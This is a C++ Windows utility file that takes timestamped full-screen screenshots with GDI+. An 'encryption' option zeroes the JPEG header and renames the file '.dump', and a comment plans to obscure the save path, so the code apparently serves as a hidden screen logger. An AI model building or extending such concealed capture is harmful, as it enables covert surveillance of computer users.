#include "stdafx.h"
#include "Utilities.h"

#pragma comment(lib, "gdiplus.lib")

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT num = 0;          // number of image encoders
	UINT size = 0;         // size of the image encoder array in bytes

	Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

	Gdiplus::GetImageEncodersSize(&num, &size);
	if (size == 0)
	{
		return -1;  // Failure
	}

	pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
	{
		return -1;  // Failure
	}

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}
	}

	free(pImageCodecInfo);
	return -1;  // Failure
}

void BitmapToJpg(HBITMAP hbmpImage, int width, int height, LPCWSTR filename, ULONG uQuality)
{
	Gdiplus::Bitmap *p_bmp = Gdiplus::Bitmap::FromHBITMAP(hbmpImage, NULL);

	CLSID pngClsid;
	Gdiplus::EncoderParameters encoderParams;
	encoderParams.Count = 1;
	encoderParams.Parameter[0].NumberOfValues = 1;
	encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
	encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
	encoderParams.Parameter[0].Value = &uQuality;
	int result = GetEncoderClsid(L"image/jpeg", &pngClsid);
	if (result != -1)
		std::cout << "Encoder succeeded" << std::endl;
	else
		std::cout << "Encoder failed" << std::endl;
	p_bmp->Save(filename, &pngClsid, &encoderParams);
	delete p_bmp;
}

void getDirectoryPath(CString &strCurPath) {
	GetModuleFileName(NULL, strCurPath.GetBuffer(MAX_PATH), MAX_PATH);
	strCurPath.ReleaseBuffer();
	int pos = strCurPath.ReverseFind(_T('\\'));
	strCurPath = strCurPath.Left(pos + 1);
}

void getNowTime(char *buffer) {
	SYSTEMTIME sys;
	GetLocalTime(&sys);
	sprintf_s(buffer, 20, "%4d-%02d-%02d-%02d-%02d-%02d",
		sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute, sys.wSecond);
}

bool ScreenCapture(int x, int y, int width, int height, LPCWSTR filename, ULONG uQuality)
{
	HDC hDc = CreateCompatibleDC(0);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
	BitmapToJpg(hBmp, width, height, filename, uQuality);
	DeleteObject(hBmp);
	return true;
}

void fillJpegHeaderWithZero(LPCTSTR filename) {
	//byte originaHeader[] = { 0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46 };
	byte padding[] = { 0,0,0,0,0,0,0,0,0,0 };
	CFile jpegFile;
	jpegFile.Open(filename, CFile::modeWrite | CFile::modeNoTruncate | CFile::typeBinary, NULL);
	jpegFile.Write(padding, 10);
	jpegFile.Close();
}

void work(CString filename, bool encryption)
{
	char *time = new char[20];
	getNowTime(time);
	filename += time;
	filename += encryption ? ".dump" : ".jpg";
	//TODO obscure the directory path

	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);

	std::cout << filename.GetString() << std::endl;
	ScreenCapture(0, 0, width, height, filename.GetString(), 100L);
	if (encryption) {
		fillJpegHeaderWithZero(filename.GetString());
	}
	delete time;
}